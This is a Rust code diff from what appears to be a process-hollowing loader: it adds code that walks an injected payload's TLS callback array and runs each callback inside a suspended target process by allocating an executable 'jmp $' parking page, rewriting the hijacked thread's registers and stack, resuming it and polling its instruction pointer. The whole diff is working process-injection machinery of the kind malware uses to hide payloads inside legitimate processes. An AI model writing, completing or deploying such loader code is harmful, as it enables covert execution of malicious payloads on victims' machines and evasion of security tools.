@@ -790,6 +790,8 @@ fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
 const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
 /// `ThreadBasicInformation` for `NtQueryInformationThread`.
 const THREAD_BASIC_INFORMATION: i32 = 0;
+/// The `Reason` a TLS callback receives on process attach.
+const TLS_REASON_ATTACH: u64 = 1;
 
 /// `THREAD_BASIC_INFORMATION` as the kernel lays it out: the TEB pointer is
 /// pointer-sized and follows the exit status directly on x86, while x64 pads the
@@ -990,14 +992,194 @@ fn provision_tls(
     };
     give_thread_tls(process, thread, &ctx)?;
 
-    // 4. TLS callbacks (`DLL_PROCESS_ATTACH`) are *not* run yet. A callback has
-    //    to run on a thread, and a freshly created (never started) thread has
-    //    no TLS array in its TEB, so it cannot be given a block pointer; the
-    //    stub itself is the only thread that can be provisioned today. Payloads
-    //    that need their CRT's TLS callback therefore still lose that init.
-    //    Follow-up: run them on the main thread once per callback, parking it on
-    //    a `jmp $` stub between calls, or provision the callback thread's TLS
-    //    array by hand.
+    // 4. Run the payload's `DLL_PROCESS_ATTACH` callbacks on this thread, which
+    //    now has its private TLS block, parking it on a `jmp $` stub between
+    //    calls (see `run_tls_callbacks`).
+    run_tls_callbacks(process, thread, target_base, image, pe, &info)?;
+
+    Ok(())
+}
+
+/// Walks the payload's null-terminated TLS callback array and returns the
+/// relocated callback addresses, in order.
+///
+/// Each entry is a pointer stored in the image and already rebased by
+/// `apply_relocations`, so reading it back out of the local (relocated) image
+/// yields the address that is valid in the target. A callback array that is not
+/// null-terminated within the image is a malformed-directory failure, not a
+/// silent truncation.
+fn read_callback_array(
+    image: &[u8],
+    pe: &Pe,
+    target_base: u64,
+    info: &TlsInfo,
+) -> Result<Vec<u64>, String> {
+    let rva = info.callbacks_va.wrapping_sub(target_base) as u32;
+    let mut off = rva_to_offset(pe, rva).ok_or_else(|| $MSG_TLS_CALLBACKS_UNMAPPED$)?;
+    let mut callbacks = Vec::new();
+    loop {
+        #[cfg(target_arch = "x86_64")]
+        let address = {
+            let end = off
+                .checked_add(8)
+                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
+            if end > image.len() {
+                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
+            }
+            read_u64(image, off)?
+        };
+        #[cfg(target_arch = "x86")]
+        let address = {
+            let end = off
+                .checked_add(4)
+                .ok_or_else(|| $MSG_TLS_CALLBACKS_UNTERMINATED$)?;
+            if end > image.len() {
+                return Err($MSG_TLS_CALLBACKS_UNTERMINATED$);
+            }
+            read_u32(image, off)? as u64
+        };
+        if address == 0 {
+            break;
+        }
+        callbacks.push(address);
+        #[cfg(target_arch = "x86_64")]
+        {
+            off += 8;
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            off += 4;
+        }
+    }
+    Ok(callbacks)
+}
+
+/// Runs the payload's `DLL_PROCESS_ATTACH` TLS callbacks on the suspended main
+/// thread, one at a time, parking it on a `jmp $` stub between calls.
+///
+/// The callbacks run on the thread that will next run the payload's entry
+/// point, after `give_thread_tls` has pointed its TLS slot at a private copy of
+/// the `.tls` template — so each callback runs with a real TLS array in its TEB.
+/// `thread` is suspended here and suspended again when this returns.
+fn run_tls_callbacks(
+    process: HANDLE,
+    thread: HANDLE,
+    target_base: u64,
+    image: &[u8],
+    pe: &Pe,
+    info: &TlsInfo,
+) -> Result<(), String> {
+    if info.callbacks_va == 0 {
+        return Ok(());
+    }
+    let callbacks = read_callback_array(image, pe, target_base, info)?;
+    if callbacks.is_empty() {
+        return Ok(());
+    }
+
+    // A dedicated `jmp $` (`EB FE`) page is the spot each callback returns into;
+    // the payload image's own entry point must stay intact for the hand-off.
+    let mut park: *mut core::ffi::c_void = core::ptr::null_mut();
+    let mut size = 0x1000usize;
+    let status = crate::nt_alloc_vm(
+        process,
+        &mut park,
+        0,
+        &mut size,
+        MEM_COMMIT.0 | MEM_RESERVE.0,
+        PAGE_EXECUTE_READWRITE.0,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_TLS_PARK_ALLOC_FAILED$, status));
+    }
+    write_remote(process, park as u64, &[0xEB, 0xFE])?;
+
+    for (index, callback) in callbacks.iter().enumerate() {
+        crate::tech_dbg!("process_hollowing", "TLS callback {index} at 0x{callback:x}");
+        run_one_callback(process, thread, park as u64, *callback, target_base)?;
+    }
+    Ok(())
+}
+
+/// Runs one relocated TLS callback on `thread` with reason `DLL_PROCESS_ATTACH`,
+/// parking the thread on `park` (a `jmp $` stub) once the callback returns.
+fn run_one_callback(
+    process: HANDLE,
+    thread: HANDLE,
+    park: u64,
+    callback: u64,
+    image_base: u64,
+) -> Result<(), String> {
+    let mut ctx = AlignedContext(CONTEXT::default());
+    ctx.0.ContextFlags = CONTEXT_FLAGS_FULL;
+    let status = crate::nt_get_context_thread(
+        thread,
+        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
+    }
+
+    // Point the thread at the callback with its three arguments, and put the
+    // parking stub where the callback's `ret` will land. The return address is
+    // pushed by hand: on x64 the arguments travel in registers, on x86 they
+    // travel on the stack (the callback is stdcall and cleans them itself).
+    #[cfg(target_arch = "x86_64")]
+    {
+        let rsp = ctx.0.Rsp.wrapping_sub(8);
+        write_remote(process, rsp, &park.to_le_bytes())?;
+        ctx.0.Rsp = rsp;
+        ctx.0.Rip = callback;
+        ctx.0.Rcx = image_base;
+        ctx.0.Rdx = TLS_REASON_ATTACH;
+        ctx.0.R8 = 0;
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        let esp = ctx.0.Esp.wrapping_sub(16);
+        let mut slots = [0u8; 16];
+        // [esp] return address, [esp+4] image, [esp+8] reason, [esp+12]
+        // reserved (zero, left by the initializer).
+        slots[0..4].copy_from_slice(&(park as u32).to_le_bytes());
+        slots[4..8].copy_from_slice(&(image_base as u32).to_le_bytes());
+        slots[8..12].copy_from_slice(&(TLS_REASON_ATTACH as u32).to_le_bytes());
+        write_remote(process, esp as u64, &slots)?;
+        ctx.0.Esp = esp;
+        ctx.0.Eip = callback as u32;
+    }
+
+    let status = crate::nt_set_context_thread(
+        thread,
+        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
+    );
+    if status < 0 {
+        return Err(nt_error($MSG_SET_CONTEXT_FAILED$, status));
+    }
+
+    let mut previous = 0u32;
+    let status = crate::nt_resume_thread(thread, &mut previous);
+    if status < 0 {
+        return Err(nt_error($MSG_RESUME_FAILED$, status));
+    }
+
+    // Poll until the callback returns into the parking stub. Bounded so a
+    // callback that never returns fails loudly instead of hanging the loader.
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
+    loop {
+        let rip = thread_rip(thread)?;
+        if rip == park {
+            break;
+        }
+        if std::time::Instant::now() >= deadline {
+            return Err($MSG_TLS_CALLBACK_TIMEOUT$);
+        }
+        std::thread::sleep(std::time::Duration::from_millis(10));
+    }
+
+    let status = crate::nt_suspend_thread(thread, &mut previous);
+    if status < 0 {
+        return Err(nt_error($MSG_SUSPEND_FAILED$, status));
+    }
     Ok(())
 }
 
